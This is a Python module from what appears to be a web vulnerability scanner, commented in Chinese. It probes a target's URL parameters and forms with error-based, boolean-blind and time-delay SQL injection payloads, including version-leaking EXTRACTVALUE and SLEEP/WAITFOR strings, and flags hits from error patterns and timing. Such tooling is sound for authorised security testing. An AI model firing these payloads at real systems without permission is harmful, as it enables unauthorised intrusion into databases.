"""
SQL 注入检测模块（报错 / 布尔盲注 / 时延盲注）
Author: 火柴 | GitHub: huocai250

修复:
- 发现漏洞后及时 return，避免对同一参数重复测试
- 优化时延基准：先采样正常响应时间，再判断延迟
- _req 统一调用 BaseScanner.get/post
"""
import re
import time
from utils.http import extract_forms
from core.scanner import BaseScanner
from core.colors import log

ERROR_PATTERNS = [
    r"SQL syntax.*?MySQL", r"Warning.*?mysql_", r"MySQLSyntaxErrorException",
    r"check the manual that (corresponds to|fits) your MySQL",
    r"com\.mysql\.jdbc\.exceptions",
    r"Unclosed quotation mark", r"Microsoft OLE DB Provider for SQL Server",
    r"SQLServer JDBC Driver", r"Incorrect syntax near",
    r"ODBC SQL Server Driver",
    r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver",
    r"quoted string not properly terminated",
    r"PostgreSQL.*ERROR", r"Warning.*pg_", r"Npgsql\.",
    r"PG::SyntaxError", r"ERROR:\s+syntax error at or near",
    r"SQLite/JDBCDriver", r"SQLite\.Exception",
    r"Warning.*sqlite_", r"SQLITE_ERROR",
    r"Syntax error.*in query expression",
    r"Microsoft Access Driver", r"JET Database Engine",
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    (" AND 1=1",      " AND 1=2"),
    ("' AND 1=1--",  "' AND 1=2--"),
]

TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:3'--",
    "' AND SLEEP(3)--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "1; SELECT pg_sleep(3)--",
]

ERROR_PAYLOADS = [
    "'", '"', "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 ORDER BY 1--",
    "1 ORDER BY 999--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

COMMON_PARAMS = ["id", "page", "q", "search", "keyword", "cat",
                 "item", "user", "uid", "pid", "cid", "type", "sort",
                 "order", "by", "name", "key", "value", "data"]


class SQLiScanner(BaseScanner):
    def run(self):
        log("INFO", "SQL 注入检测（报错/布尔/时延）...")
        r = self.get(self.target)
        # 采样基准响应时间
        self._baseline_time = self._sample_baseline()
        # URL 参数测试
        self._test_url_params()
        # 表单测试
        if r:
            for i, form in enumerate(extract_forms(r.text)):
                self._test_form(form, i)

    def _sample_baseline(self) -> float:
        """采样3次正常响应时间取平均，减少误判"""
        times = []
        for _ in range(3):
            t0 = time.time()
            self.get(self.target)
            times.append(time.time() - t0)
        return sum(times) / len(times) if times else 1.0

    def _test_url_params(self):
        for param in COMMON_PARAMS:
            if self._test_error_based(self.target, {param: "1"}, param, "GET"):
                continue
            if self._test_boolean_based(self.target, {param: "1"}, param, "GET"):
                continue
            self._test_time_based(self.target, {param: "1"}, param, "GET")

    def _test_form(self, form, idx):
        action = form["action"] or self.target
        if not action.startswith("http"):
            action = self.url(action)
        for param in form["inputs"]:
            if self._test_error_based(action, form["inputs"].copy(), param, form["method"]):
                return  # 发现漏洞，跳过同表单其他参数
            if self._test_boolean_based(action, form["inputs"].copy(), param, form["method"]):
                return
            self._test_time_based(action, form["inputs"].copy(), param, form["method"])

    def _test_error_based(self, url, params, param, method) -> bool:
        for payload in ERROR_PAYLOADS:
            test = params.copy()
            test[param] = str(params.get(param, "1")) + payload
            r = self._req(method, url, test)
            if r and self._has_sql_error(r.text):
                log("VULN", f"[报错注入] 参数: {param} | Payload: {payload[:30]}")
                self.result.add("SQL 注入", "CRITICAL",
                                f"[报错注入] 参数 '{param}' 存在 SQL 注入",
                                f"Payload: {payload}", url=url)
                return True
        return False

    def _test_boolean_based(self, url, params, param, method) -> bool:
        orig_r = self._req(method, url, params)
        if not orig_r:
            return False
        orig_len = len(orig_r.text)
        for true_p, false_p in BOOLEAN_PAYLOADS:
            base_val = str(params.get(param, "1"))
            t = params.copy(); t[param] = base_val + true_p
            f = params.copy(); f[param] = base_val + false_p
            tr = self._req(method, url, t)
            fr = self._req(method, url, f)
            if not (tr and fr):
                continue
            true_len  = len(tr.text)
            false_len = len(fr.text)
            # 判断条件：true 与 orig 相近，false 与 orig 差距明显
            if (abs(true_len - orig_len) < 30 and
                    abs(false_len - orig_len) > 80):
                log("VULN", f"[布尔盲注] 参数: {param} | true_len={true_len} false_len={false_len}")
                self.result.add("SQL 注入", "HIGH",
                                f"[布尔盲注] 参数 '{param}' 疑似布尔盲注",
                                f"orig={orig_len} true={true_len} false={false_len}",
                                url=url)
                return True
        return False

    def _test_time_based(self, url, params, param, method) -> bool:
        threshold = max(self._baseline_time * 2 + 2.0, 3.0)
        for payload in TIME_PAYLOADS:
            test = params.copy()
            test[param] = str(params.get(param, "1")) + payload
            t0 = time.time()
            self._req(method, url, test)
            elapsed = time.time() - t0
            if elapsed >= threshold:
                log("VULN", f"[时延盲注] 参数: {param} 响应 {elapsed:.1f}s (基准 {self._baseline_time:.1f}s)")
                self.result.add("SQL 注入", "HIGH",
                                f"[时延盲注] 参数 '{param}' 疑似时延盲注 (响应 {elapsed:.1f}s)",
                                f"Payload: {payload}", url=url)
                return True
        return False

    def _req(self, method, url, params):
        if method == "POST":
            return self.post(url, data=params)
        return self.get(url, params=params)

    def _has_sql_error(self, text: str) -> bool:
        return any(re.search(p, text, re.I) for p in ERROR_PATTERNS)
